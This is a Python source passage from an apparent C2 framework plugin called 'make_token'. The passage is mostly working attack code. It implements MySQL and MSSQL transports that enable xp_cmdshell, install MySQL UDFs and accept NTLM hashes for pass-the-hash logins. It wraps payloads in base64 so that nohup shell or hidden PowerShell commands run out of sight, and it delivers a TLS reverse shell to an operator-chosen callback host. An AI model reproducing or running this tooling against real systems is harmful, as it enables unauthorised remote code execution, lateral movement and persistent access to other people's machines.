        if not self.connected:
            return False, "Not connected"

        target_os = target_os or self._target_os or 'linux'
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        if self._exec_method in ('sys_exec', 'sys_eval'):
            return self._exec_via_udf(command)
        return False, "No MySQL command execution method available"

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        if target_os in ('linux', 'unix'):
            wrapped = f'nohup sh -c "{payload}" >/dev/null 2>&1 &'
        elif target_os == 'windows':
            wrapped = f'cmd.exe /c start /b {payload}'
        else:
            wrapped = payload
        return self.execute_command(wrapped, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._exec_method = None
        self._udf_binary_path = None
        self._capabilities = {}
        self._connect_timeout = self.CONNECT_TIMEOUT_FAST
        self._udf_load_reason = None
        self._target_arch = None
        self._install_authorized = False

    def _perform_platform_detection(self) -> str:
        if not self.connected:
            return "unknown"
        ok, out, _ = self._run_sql("SELECT @@version_compile_os")
        if ok:
            v = out.strip().lower()
            if 'win' in v:
                return "windows"
            return "linux"
        return self._target_os or "unknown"


class MSSQLTransport(RemoteTransport):
    """MSSQL transport using mssqlclient.py (impacket) or netexec/nxc.

    In netexec mode, we first try to enable xp_cmdshell using the built‑in
    'enable_cmdshell' module. If that fails, we fall back to the manual SQL
    approach (sp_configure).
    """

    def __init__(self):
        super().__init__()
        self._mssqlclient_cmd = None
        self._nxc_cmd = None
        self._netexec_available = False
        self._xp_cmdshell_enabled = False

    def _ensure_dependency(self):
        if self._check_command('mssqlclient.py'):
            self._mssqlclient_cmd = 'mssqlclient.py'
        elif self._check_command('impacket-mssqlclient'):
            self._mssqlclient_cmd = 'impacket-mssqlclient'
        else:
            self._mssqlclient_cmd = None

        if self._check_command('nxc'):
            self._nxc_cmd = 'nxc'
        elif self._check_command('netexec'):
            self._nxc_cmd = 'netexec'
        else:
            self._nxc_cmd = None
        self._netexec_available = self._nxc_cmd is not None

        if not (self._mssqlclient_cmd or self._netexec_available):
            raise RemoteTransportError(
                "MSSQL requires either 'mssqlclient.py' (or 'impacket-mssqlclient') from impacket, or 'nxc'/'netexec'. "
                "Install impacket: pip install impacket, or netexec: pip install netexec"
            )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("MSSQL does not support private key authentication")
        ntlm_hash = kwargs.get('ntlm_hash')
        use_nxc = kwargs.get('use_nxc', False)
        port = kwargs.get('port')
        if port is None:
            port = self.DEFAULT_PORTS['mssql']
        target_os = kwargs.get('target_os', 'windows')
        callback_host = kwargs.get('callback_host')
        callback_port = kwargs.get('callback_port')

        if not password and not ntlm_hash:
            raise RemoteTransportError("Password or NTLM hash required for MSSQL")

        self._host = host
        self._username = username
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target_os = target_os
        self._callback_host = callback_host
        self._callback_port = callback_port
        self._port = port
        self._use_nxc = use_nxc

        if self._use_nxc:
            if not self._netexec_available:
                raise RemoteTransportError("netexec/nxc not available for MSSQL")
            return self._connect_nxc(host, username, password, ntlm_hash, port)
        else:
            if not self._mssqlclient_cmd:
                raise RemoteTransportError("No mssqlclient command found (tried mssqlclient.py and impacket-mssqlclient)")
            return self._connect_mssqlclient(host, username, password, ntlm_hash, port)

    def _connect_mssqlclient(self, host: str, username: str, password: Optional[str] = None,
                             ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
        host_spec = f"{host}:{port}" if port else host
        query = "SELECT 1"
        try:
            if password:
                cmd = [self._mssqlclient_cmd, f'{username}:{password}@{host_spec}', '-query', query]
            elif ntlm_hash:
                cmd = [self._mssqlclient_cmd, f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}', '-query', query]
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            if success and '1' in stdout:
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"{self._mssqlclient_cmd} connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"{self._mssqlclient_cmd} connection failed: {e}")

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
        try:
            cmd = [self._nxc_cmd, 'mssql', host, '-u', username]
            if port:
                cmd.extend(['--port', str(port)])
            if ntlm_hash:
                cmd.extend(['-H', ntlm_hash])
            elif password:
                cmd.extend(['-p', password])
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            cmd.extend(['-q', 'SELECT 1'])
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"{self._nxc_cmd} MSSQL connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"{self._nxc_cmd} MSSQL connection failed: {e}")

    def _enable_xp_cmdshell_with_module(self) -> bool:
        cmd = [self._nxc_cmd, 'mssql', self._host, '-u', self._username]
        if self._ntlm_hash:
            cmd.extend(['-H', self._ntlm_hash])
        elif self._password:
            cmd.extend(['-p', self._password])
        else:
            return False
        if self._port:
            cmd.extend(['--port', str(self._port)])
        cmd.extend(['-M', 'enable_cmdshell', '-o', 'ACTION=enable'])
        success, stdout, stderr = self._run_command(cmd, timeout=30)
        if success:
            verify_cmd = [self._nxc_cmd, 'mssql', self._host, '-u', self._username]
            if self._ntlm_hash:
                verify_cmd.extend(['-H', self._ntlm_hash])
            elif self._password:
                verify_cmd.extend(['-p', self._password])
            if self._port:
                verify_cmd.extend(['--port', str(self._port)])
            verify_cmd.extend(['-q', "EXEC xp_cmdshell 'echo 1'"])
            v_success, v_stdout, _ = self._run_command(verify_cmd, timeout=15)
            if v_success and '1' in v_stdout:
                return True
        return False

    def _enable_xp_cmdshell_manual(self) -> bool:
        check_sql = "IF EXISTS (SELECT 1 FROM sys.configurations WHERE name='xp_cmdshell' AND value=1) SELECT 1 ELSE SELECT 0"
        success, output = self._execute_sql(check_sql)
        if success and '1' in output:
            return True
        enable_sql = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        success, output = self._execute_sql(enable_sql)
        return success

    def _enable_xp_cmdshell(self) -> bool:
        if self._xp_cmdshell_enabled:
            return True
        if self._use_nxc and self._netexec_available:
            if self._enable_xp_cmdshell_with_module():
                self._xp_cmdshell_enabled = True
                return True
        if self._enable_xp_cmdshell_manual():
            self._xp_cmdshell_enabled = True
            return True
        return False

    def _execute_sql(self, sql: str) -> Tuple[bool, str]:
        if self._use_nxc:
            cmd = [self._nxc_cmd, 'mssql', self._host, '-u', self._username]
            if self._ntlm_hash:
                cmd.extend(['-H', self._ntlm_hash])
            elif self._password:
                cmd.extend(['-p', self._password])
            else:
                return False, "No authentication"
            if self._port:
                cmd.extend(['--port', str(self._port)])
            cmd.extend(['-q', sql])
            success, stdout, stderr = self._run_command(cmd, timeout=60)
            return success, stdout if success else stderr
        else:
            if not self._mssqlclient_cmd:
                return False, "No mssqlclient available"
            host_spec = f"{self._host}:{self._port}" if self._port else self._host
            if self._password:
                cmd = [self._mssqlclient_cmd, f'{self._username}:{self._password}@{host_spec}', '-query', sql]
            elif self._ntlm_hash:
                cmd = [self._mssqlclient_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', '-query', sql]
            else:
                return False, "No authentication"
            success, stdout, stderr = self._run_command(cmd, timeout=60)
            return success, stdout if success else stderr

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"

        target_os = target_os or self._target_os or 'windows'
        if target_os != 'windows':
            return False, "MSSQL command execution via xp_cmdshell is only supported on Windows targets"

        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        if not self._enable_xp_cmdshell():
            return False, "Failed to enable xp_cmdshell"

        if self._use_nxc:
            sql = f"EXEC xp_cmdshell '{command}'"
            return self._execute_sql(sql)
        else:
            if not self._mssqlclient_cmd:
                return False, "No mssqlclient available"
            host_spec = f"{self._host}:{self._port}" if self._port else self._host
            try:
                if self._password:
                    cmd = [self._mssqlclient_cmd, f'{self._username}:{self._password}@{host_spec}', '-x', command]
                elif self._ntlm_hash:
                    cmd = [self._mssqlclient_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', '-x', command]
                else:
                    return False, "No authentication"
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._ntlm_hash = None
        self._xp_cmdshell_enabled = False

    def _perform_platform_detection(self) -> str:
        return "windows"


def get_transport(protocol: str) -> RemoteTransport:
    transports = {
        'ssh': SSHTransport,
        'winrm': WinRMTransport,
        'smb': SMBTransport,
        'wmi': WMITransport,
        'mssql': MSSQLTransport,
        'dcom': DCOMTransport,
        'mysql': MySQLTransport,
    }
    if protocol.lower() not in transports:
        raise RemoteTransportError(f"Unsupported protocol: {protocol}")
    return transports[protocol.lower()]()


def validate_protocol_compatibility(protocol: str, target_platform: str) -> bool:
    supported = RemoteTransport.SUPPORTED_OS.get(protocol.lower(), [])
    platform_map = {
        'windows': 'windows', 'win': 'windows',
        'linux': 'linux', 'nix': 'linux', 'unix': 'linux',
        'macos': 'macos', 'mac': 'macos', 'darwin': 'macos',
    }
    norm = platform_map.get(target_platform.lower(), target_platform.lower())
    return norm in supported


def parse_make_token_args(args: list) -> Dict[str, Any]:
    parser = argparse.ArgumentParser(
        description='Make token - establish C2 session via remote protocol and deliver reverse shell payload (TLS)'
    )
    parser.add_argument('-x', '--protocol', required=True,
                        choices=['ssh', 'winrm', 'smb', 'wmi', 'mssql', 'dcom', 'mysql'],
                        help='Remote protocol to use')
    parser.add_argument('--os', required=True,
                        choices=['windows', 'linux', 'unix'],
                        help='Target operating system')
    parser.add_argument('-i', '--ip', required=True, help='Target IP address')
    parser.add_argument('-P', '--port', type=int, help='Custom port number (default: protocol default)')
    parser.add_argument('-u', '--username', required=True, help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('-c', '--key', help='SSH private key path (SSH only)')
    parser.add_argument('-H', '--hash', help='NTLM hash for authentication (SMB/WinRM/WMI/MSSQL/DCOM)')
    parser.add_argument('--cert-pfx', dest='cert_pfx',
                        help='PFX file with a client certificate (WinRM only, enables cert auth over HTTPS)')
    parser.add_argument('--cert-pass', dest='cert_pass', default='winrmbind',
                        help="Password for the PFX file (default: 'winrmbind')")
    parser.add_argument('--mysql-udf', dest='mysql_udf', nargs='?', const='auto', default=None,
                        help='Authorize the MySQL transport to install lib_mysqludf_sys on the '
                            'target and proceed to command execution.\n'
                            '  --mysql-udf                use the cached binary in '
                            'mysql_udf_libraries/ (downloaded on first use)\n'
                            '  --mysql-udf /path/to.so    use an explicit local binary\n'
                            'If omitted, the transport only probes the target and reports '
                            'whether UDF installation would be possible.')
    parser.add_argument('--nxc', action='store_true', help='Use netexec tool instead of native protocol tools')
    parser.add_argument('-rh', '--callback-host',
                        help='Reverse shell listener host (TLS) – required unless --custom-payload is used')
    parser.add_argument('-rp', '--callback-port', type=int,
                        help='Reverse shell listener TLS port – required unless --custom-payload is used')
    parser.add_argument('-C', '--custom-payload', nargs=argparse.REMAINDER,
                        help='Custom command to execute instead of the built-in reverse shell. '
                            'All remaining arguments are treated as the command. '
                            'When provided, -rh and -rp are not required.')

    try:
        parsed = parser.parse_args(args)

        custom_payload_list = parsed.custom_payload
        if custom_payload_list is not None:
            if not custom_payload_list:
                raise RemoteTransportError("Custom payload cannot be empty.")
            custom_payload = ' '.join(custom_payload_list)
        else:
            custom_payload = None

        if not custom_payload:
            if parsed.callback_host is None or parsed.callback_port is None:
                raise RemoteTransportError(
                    "When --custom-payload is not provided, both -rh and -rp are required."
                )
        else:
            parsed.callback_host = parsed.callback_host or "custom"
            parsed.callback_port = parsed.callback_port or 0

        if parsed.port and (parsed.port < 1 or parsed.port > 65535):
            raise RemoteTransportError("Port must be between 1 and 65535")

        if not validate_protocol_compatibility(parsed.protocol, parsed.os):
            raise RemoteTransportError(
                f"{parsed.protocol.upper()} is not compatible with {parsed.os} target"
            )

        if parsed.protocol == 'ssh':
            if not parsed.password and not parsed.key:
                raise RemoteTransportError("SSH requires either -p (password) or -c (key)")
            if parsed.hash:
                raise RemoteTransportError("SSH does not support NTLM hash")
            if parsed.cert_pfx:
                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
            if parsed.mysql_udf:
                raise RemoteTransportError("--mysql-udf is only supported for the mysql protocol")

        elif parsed.protocol == 'winrm':
            if parsed.key:
                raise RemoteTransportError("WinRM does not support private key")
            if parsed.mysql_udf:
                raise RemoteTransportError(
                    "--mysql-udf is only supported for the mysql protocol"
                )
            if parsed.nxc:
                raise RemoteTransportError(
                    "WinRM does not support --nxc. The transport is backed "
                    "exclusively by evil-winrm so that reverse-shell payloads "
                    "survive WinRM session teardown. Re-run without --nxc."
                )
            if parsed.cert_pfx:
                if not os.path.isfile(parsed.cert_pfx):
                    raise RemoteTransportError(
                        f"PFX file not found: {parsed.cert_pfx}"
                    )
                if not shutil.which('openssl'):
                    raise RemoteTransportError(
                        "openssl is required to extract the PEM for evil-winrm. "
                        "Install with: apt install openssl"
                    )
                if not shutil.which('evil-winrm'):
                    raise RemoteTransportError(
                        "evil-winrm is required for --cert-pfx. "
                        "Install with: apt install evil-winrm"
                    )
            else:
                if not parsed.password and not parsed.hash:
                    raise RemoteTransportError(
                        "WinRM requires -p (password), -H (hash), or --cert-pfx"
                    )
            if parsed.os != 'windows':
                raise RemoteTransportError("WinRM only supports Windows targets")

        elif parsed.protocol == 'smb':
            if parsed.key:
                raise RemoteTransportError("SMB does not support private key")
            if parsed.cert_pfx:
                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
            if parsed.mysql_udf:
                raise RemoteTransportError("--mysql-udf is only supported for the mysql protocol")
            if not parsed.password and not parsed.hash:
                raise RemoteTransportError("SMB requires either -p (password) or -H (hash)")

        elif parsed.protocol == 'wmi':
            if parsed.key:
                raise RemoteTransportError("WMI does not support private key")
            if parsed.cert_pfx:
                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
            if parsed.mysql_udf:
                raise RemoteTransportError("--mysql-udf is only supported for the mysql protocol")
            if not parsed.password and not parsed.hash:
                raise RemoteTransportError("WMI requires either -p (password) or -H (hash)")
            if parsed.os != 'windows':
                raise RemoteTransportError("WMI only supports Windows targets")

        elif parsed.protocol == 'mssql':
            if parsed.key:
                raise RemoteTransportError("MSSQL does not support private key")
            if parsed.cert_pfx:
                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
            if parsed.mysql_udf:
                raise RemoteTransportError("--mysql-udf is only supported for the mysql protocol")
            if not parsed.password and not parsed.hash:
                raise RemoteTransportError("MSSQL requires either -p (password) or -H (hash)")
            if parsed.os != 'windows':
                raise RemoteTransportError("MSSQL with xp_cmdshell only supports Windows targets")

        elif parsed.protocol == 'dcom':
            if parsed.key:
                raise RemoteTransportError("DCOM does not support private key")
            if parsed.cert_pfx:
                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
            if parsed.mysql_udf:
                raise RemoteTransportError("--mysql-udf is only supported for the mysql protocol")
            if not parsed.password and not parsed.hash:
                raise RemoteTransportError("DCOM requires either -p (password) or -H (hash)")
            if parsed.os != 'windows':
                raise RemoteTransportError("DCOM only supports Windows targets")

        elif parsed.protocol == 'mysql':
            if parsed.key:
                raise RemoteTransportError("MySQL does not support private key")
            if parsed.hash:
                raise RemoteTransportError("MySQL does not support NTLM hash")
            if parsed.cert_pfx:
                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
            if parsed.mysql_udf and parsed.mysql_udf != 'auto' \
                    and not os.path.isfile(parsed.mysql_udf):
                raise RemoteTransportError(f"--mysql-udf file not found: {parsed.mysql_udf}")

        return {
            'protocol': parsed.protocol,
            'os': parsed.os,
            'ip': parsed.ip,
            'port': parsed.port,
            'username': parsed.username,
            'password': parsed.password,
            'key': parsed.key,
            'hash': parsed.hash,
            'cert_pfx': parsed.cert_pfx,
            'cert_pass': parsed.cert_pass,
            'mysql_udf': parsed.mysql_udf,
            'use_nxc': parsed.nxc,
            'callback_host': parsed.callback_host,
            'callback_port': parsed.callback_port,
            'custom_payload': custom_payload,
        }
    except SystemExit:
        raise RemoteTransportError("Invalid arguments. See --help for usage.")


def format_make_token_report(data: Dict) -> str:
    lines = ['Make Token Result', '-' * 18]
    safe_fields = {
        'protocol': 'Protocol',
        'ip': 'IP',
        'port': 'Port',
        'username': 'Username',
        'platform': 'Platform',
        'status': 'Status',
        'tool': 'Tool',
        'auth_method': 'Auth Method',
        'callback_host': 'Callback Host',
        'callback_port': 'Callback Port',
    }
    for key, label in safe_fields.items():
        val = data.get(key)
        if val not in (None, ''):
            lines.append(f'{label:<14}{val}')
    if data.get('error'):
        lines.append(f"Error:         {data['error']}")
    if data.get('message'):
        lines.append(f"Message:       {data['message']}")
    return '\n'.join(lines)


@plugin.command(
    name='make_token',
    platforms=['linux', 'windows', 'unix'],
    description='Establish C2 session via remote protocol and deliver reverse shell payload (TLS)',
)
def run(session: SessionContext, args):
    if not args or any(a in args for a in ('-h', '--help')):
        session.print(MAKE_TOKEN_USAGE)
        return 0
    session.log_event('make_token: execution started')

    try:
        params = parse_make_token_args(args)
    except RemoteTransportError as e:
        session.print(f"Argument error: {e}", 'red')
        session.log_plugin_result('make_token', '', 'argument_error')
        return 1

    protocol = params['protocol']
    target_os = params['os']
    ip = params['ip']
    port = params['port']
    username = params['username']
    password = params['password']
    key = params['key']
    ntlm_hash = params['hash']
    cert_pfx = params.get('cert_pfx')
    cert_pass = params.get('cert_pass')
    mysql_udf = params.get('mysql_udf')
    use_nxc = params['use_nxc']
    callback_host = params['callback_host']
    callback_port = params['callback_port']
    custom_payload = params.get('custom_payload')

    tool_info = ""
    if protocol == 'winrm':
        if cert_pfx:
            tool_info = " using evil-winrm (cert auth)"
        else:
            tool_info = " using interactive evil-winrm"
    elif use_nxc:
        tool_info = " using netexec (nxc)"
    elif protocol == 'ssh':
        tool_info = " using ssh"
    elif protocol == 'smb':
        tool_info = " using netexec/impacket"
    elif protocol == 'wmi':
        tool_info = " using netexec/impacket-wmiexec"
    elif protocol == 'mssql':
        tool_info = " using netexec/impacket-mssqlclient"
    elif protocol == 'dcom':
        tool_info = " using dcomexec.py (impacket)"
    elif protocol == 'mysql':
        tool_info = " using mysql/mariadb client"

    try:
        transport = get_transport(protocol)
    except RemoteTransportError as e:
        session.print(f"Transport error: {e}", 'red')
        session.log_plugin_result('make_token', '', str(e))
        return 1

    try:
        if cert_pfx:
            auth_method = "client certificate"
        elif password:
            auth_method = "password"
        elif key:
            auth_method = "SSH key"
        elif ntlm_hash:
            auth_method = "NTLM hash"
        else:
            auth_method = "unknown"

        session.print(f"Connecting to {ip} via {protocol.upper()}{tool_info}...", 'yellow')

        connect_kwargs = {
            'private_key': key,
            'ntlm_hash': ntlm_hash,
            'use_nxc': use_nxc,
            'port': port,
            'target_os': target_os,
            'callback_host': callback_host,
            'callback_port': callback_port,
            'cert_pfx': cert_pfx,
            'cert_pass': cert_pass,
            'mysql_udf': mysql_udf,
        }

        transport.connect(ip, username, password, **connect_kwargs)
        session.print(f"Connected successfully via {protocol.upper()}", 'green')
    except RemoteTransportError as e:
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'status': 'failed',
            'error': str(e),
        }
        if custom_payload:
            result['custom_payload'] = custom_payload
        else:
            result['callback_host'] = callback_host
            result['callback_port'] = callback_port
        if cert_pfx:
            result['auth_method'] = 'client certificate'
        elif ntlm_hash:
            result['auth_method'] = 'NTLM hash'
        elif key:
            result['auth_method'] = 'SSH key'
        elif password:
            result['auth_method'] = 'password'
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), str(e))
        transport.close()
        return 1

    try:
        target_platform = params['os']

        detected_platform = transport.detect_platform()
        if detected_platform != "unknown":
            session.print(f"Detected platform (informational): {detected_platform}", 'cyan')
        else:
            session.print("Platform detection returned unknown, using --os value.", 'yellow')
        session.print(f"Target platform: {target_platform}", 'cyan')
    except Exception as e:
        transport.close()
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'status': 'failed',
            'error': f'Platform detection failed: {e}',
        }
        if custom_payload:
            result['custom_payload'] = custom_payload
        else:
            result['callback_host'] = callback_host
            result['callback_port'] = callback_port
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), str(e))
        return 1

    if not validate_protocol_compatibility(protocol, target_platform):
        transport.close()
        error_msg = f"{protocol.upper()} is not compatible with {target_platform} target"
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'platform': target_platform,
            'status': 'failed',
            'error': error_msg,
        }
        if custom_payload:
            result['custom_payload'] = custom_payload
        else:
            result['callback_host'] = callback_host
            result['callback_port'] = callback_port
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), error_msg)
        return 1

    if custom_payload:
        if target_platform in ('linux', 'unix'):
            encoded = base64.b64encode(custom_payload.encode()).decode()
            prepared_payload = f"nohup sh -c \"echo '{encoded}' | base64 -d | sh\" >/dev/null 2>&1 &"
        elif target_platform == 'windows':
            encoded = base64.b64encode(custom_payload.encode('utf-16le')).decode()
            prepared_payload = (
                f"powershell -Command "
                f"\"Start-Process -WindowStyle Hidden -FilePath powershell -ArgumentList '-EncodedCommand {encoded}'\""
            )
        else:
            prepared_payload = custom_payload

        session.print(f"Executing custom payload (backgrounded): {custom_payload}", 'yellow')
        success, output = transport.execute_command(prepared_payload, target_platform, background=True)
    else:
        session.print(f"Generating reverse shell payload for {target_platform} (TLS to {callback_host}:{callback_port})...", 'yellow')
        payload = transport.generate_payload(target_platform, callback_host, callback_port)
        session.print("Delivering payload in background...", 'yellow')
        success, output = transport.deliver_payload(payload, target_platform)


    if success:
        session.print("Payload delivered successfully! Reverse shell should connect back shortly.", 'green')
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'platform': target_platform,
            'status': 'success',
        }
        if custom_payload:
            result['message'] = 'Custom payload executed'
            result['custom_payload'] = custom_payload
        else:
            result['message'] = 'Reverse shell payload delivered (background)'
            result['callback_host'] = callback_host
            result['callback_port'] = callback_port
        if protocol == 'winrm':
            if cert_pfx:
                result['tool'] = 'evil-winrm (cert auth)'
            else:
                result['tool'] = 'evil-winrm (interactive)'
        elif use_nxc:
            result['tool'] = 'netexec (nxc)'
        if cert_pfx:
            result['auth_method'] = 'client certificate'
        elif ntlm_hash:
            result['auth_method'] = 'NTLM hash'
        elif key:
            result['auth_method'] = 'SSH key'
        elif password:
            result['auth_method'] = 'password'
        session.print(format_make_token_report(result), 'green')
        session.log_plugin_result('make_token', format_make_token_report(result), 'success')
    else:
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'platform': target_platform,
            'status': 'failed',
            'error': f'Payload execution failed: {output}',
        }
        if custom_payload:
            result['custom_payload'] = custom_payload
        else:
            result['callback_host'] = callback_host
            result['callback_port'] = callback_port
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), output)

    transport.close()
    return 0 if success else 1